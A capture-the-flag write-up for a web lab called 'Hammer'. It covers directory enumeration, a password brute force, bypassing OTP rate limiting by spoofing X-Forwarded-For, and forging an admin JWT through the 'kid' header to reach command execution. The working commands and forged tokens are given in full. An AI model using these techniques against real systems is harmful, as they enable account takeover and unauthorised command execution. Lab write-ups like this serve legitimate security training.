+++
title = "Hammer - Web-pentesting"
date = "2026-01-31"
author = "Silent Resistor"
+++

## Intial observation

- Upon doing a nmap scan on the target machine, we get know - there is webserver running on port 1337

- I had a closed look at the website, i do not find any of flags. except login page code left comment saying `<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->`. So, why dont scan all the dir starting with hmr_
```bash
ffuf -u 'http://10.49.149.19:1337/hmr_FUZZ' -w /usr/share/wordlists/dirb/big.txt 
css                    # nothing, but a bootstrap css
images                 # A hammer image
js                     # min.js file, i do not think its usefull
logs                   # Seems, i found a error.logs, it may reveal some information.
```

- Upon observing the /hmr_logs/error.logs file, following info is revealed.
```
webdir: /var/www/html
A test user: { email = tester@hammer.thm }
/restricted-area" - denied server configuration
/home/hammerthm/test.php - denied by server configuration
/admin-login - probably admin page, test user tried to loggin in admin, but failed - so he is not admin.
```

- Again Did a directory enumeration as whole on website :)
```bash
ffuf -u 'http://10.49.149.19:1337/FUZZ' -w /usr/share/wordlists/dirb/big.txt   -t 1000  -b 400-500
gobuster dir  -u "http://10.49.149.19:1337" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt # this wordlist not giving good resutls
.htpasswd     # do not access
.htaccess     # do not access
/javascript   # do not enough permissions to open      
/vendor       # Voila, Seems like a directory exposed to web
/phpmyadmin   # A php admin site
```
- I keep observing /vendor directory, honestly i do not find any flags. It just seems third party libraries in php.


## Part1: Time for Action - Bruteforce
- I tried brute forcing loging page, it does not worked. 
```bash
ffuf -u 'http://10.49.149.19:1337/' -d 'email=tester%40hammer.thm&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://10.49.149.19:1337' -H 'Cookie: PHPSESSID=md4lrhv2gqqains5nsr8j7fns9' -w /usr/share/wordlists/rockyou.txt -t 1000 -fr 'Invalid Email or Password!'
```
- Intruder Brute force on OTPs of the reset_password for tester@hammer.thm in burp revealeed, there is implementation of rate-limiting inside backend of reset_password. It giving the error after a specific number (for me its 7) attempts. 
- Honestly, i wasn't sure, how to break rate limiting, some blogs revealed use of `X-Forwarded-For` in request headers to tell server about client's IP. This is generally used in server with proxies to track the client's activities.
- In this case, i we do not have proxies, and we make use of this vulnerability. What we do is, tell the server that requests are coming from varios IPs using `X-Forwarded-For` header, so bypassing the rate-limiting.
- Ok, Now reset the password for tester@hammer.thm, enter the randam OTP and capture request it in burp. 
```
# Generate OTPs list for bruteforce using the crunch
crunch 4 4 0123456789 -o otp-list.txt
# Now, Brute force with ffuf
ffuf -u 'http://10.49.149.19:1337/reset_password.php' -d 'recovery_code=FUZZ&s=170' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://10.49.149.19:1337' -H 'Cookie: PHPSESSID=md4lrhv2gqqains5nsr8j7fns9' -H 'X-Forwarded-For: FUZZ' -w otp_numbers.txt  -t 1000 -fr 'Invalid or expired recovery code!'
```
- Above brute force may reveal the otp, lets give new password for user and logIN.
- First flag is revealed.



## Part2: Remote code execution
- Upon loggin with new password, its turns out there is auto logout after few seconds. I do not have any option, but to capture the request in burp repeater and execute  commands from there.
- Honestly, Seems like my role is not admin, allowing me to execute only `ls` command. 
```bash
ls
188ade1.key    # curl http://10.49.149.19:1337/188ade1.key --> 56058354efb3daa97ebab00fabd7a7d7
composer.json  # cat composer.json in website --> "{\n    \"require\": {\n        \"firebase\/php-jwt\": \"^6.10\"\n    }\n}\n"
config.php
dashboard.php
execute_command.php
hmr_css
hmr_images
hmr_js
hmr_logs
index.php 
logout.php
reset_password.php
```
- Upon observation of request, its reveals usage of jwt for the authentication and authorization. Ok why dont we decode the token and see what there in. Yeah did.
```json
# Token
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzY5ODc4NTAxLCJleHAiOjE3Njk4ODIxMDEsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJ1c2VyIn19.erK8sC2UYS5suyRWwIjMdSbvA8sxIYUvzKbJ-58szio
# After decoding, Headers
{
  "typ": "JWT",
  "alg": "HS256",
  "kid": "/var/www/mykey.key"
}
# Paylaod
{
  "iss": "http://hammer.thm",
  "aud": "http://hammer.thm",
  "iat": 1769878501,
  "exp": 1769882101,
  "data": {
    "user_id": 1,
    "email": "tester@hammer.thm",
    "role": "user"
  }
}
```
- Developer might have not included kid, and role in the token itself. Lets make use of vulnerability by making new token with our own kid, and role using url: https://xjwt.com
- We will use key, already present at the root directory of website `kid: /var/www/html/188ade1.key` and `role: admin`
```
# Headers
{
  "typ": "JWT",
  "alg": "HS256",
  "kid": "/var/www/html/188ade1.key"
}
# Payload
{
  "iss": "http://hammer.thm",
  "aud": "http://hammer.thm",
  "iat": 1769878501,
  "exp": 1769882101,
  "data": {
    "user_id": 1,
    "email": "tester@hammer.thm",
    "role": "admin"
  }
}
# Key
56058354efb3daa97ebab00fabd7a7d7
# Generated token
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L2h0bWwvMTg4YWRlMS5rZXkifQ.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzY5ODc4NTAxLCJleHAiOjE3Njk4ODIxMDEsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ.beXn8RMbKeq8qgAMvkKPZ86IZ7nc4IpeYMv7v9jJXUo
```

- Lets make use of this new token in captured request on repeater of burp suit, and run `cat /home/ubuntu/flag.txt` command there.
- It will reveal the second Flag.
- Yeah that's it, We solved CTF.









